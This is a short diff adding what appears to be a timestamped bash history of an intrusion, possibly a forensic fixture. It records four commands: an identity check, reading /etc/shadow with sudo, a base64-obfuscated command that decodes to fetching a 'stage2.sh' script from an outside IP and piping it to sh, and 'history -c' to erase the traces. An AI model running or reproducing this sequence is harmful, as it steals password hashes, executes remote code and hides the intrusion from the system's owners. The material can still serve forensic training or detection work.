@@ -1,0 +1,8 @@
+#1791429287
+id
+#1791429308
+sudo cat /etc/shadow
+#1791429406
+echo Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC45L3N0YWdlMi5zaCB8IHNo | base64 -d | sh
+#1791429467
+history -c
